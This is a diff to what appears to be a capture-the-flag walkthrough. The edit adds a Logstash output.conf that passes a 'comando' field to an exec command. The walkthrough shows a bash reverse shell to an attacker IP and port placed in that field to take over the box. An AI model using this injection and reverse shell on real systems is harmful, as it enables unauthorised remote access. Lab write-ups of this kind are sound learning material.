@@ -238,7 +238,20 @@ filter {
 
 `Ejecutar` + `<whitespace>` + `commando` + `<whitespace>` + `:` + `<whitespace>` + `<command>`
 
-*In order to own this box,* we would do something like **place a reverse shell as the** `commando` **argument.**
+so that **the "commando" argument would get executed** as in `output.conf`:
+
+```
+output {
+    if [type] == "execute" {
+        stdout { codec => json }
+        exec {
+            command => "%{comando} &"
+        }
+    }
+}
+```
+
+***to own this box,*** we would do something like **place a reverse shell in the** `commando` **argument's place** like below:
 ```
 Ejecutar comando : bash -i >& /dev/tcp/10.10.16.9/9000 0>&1
 ```
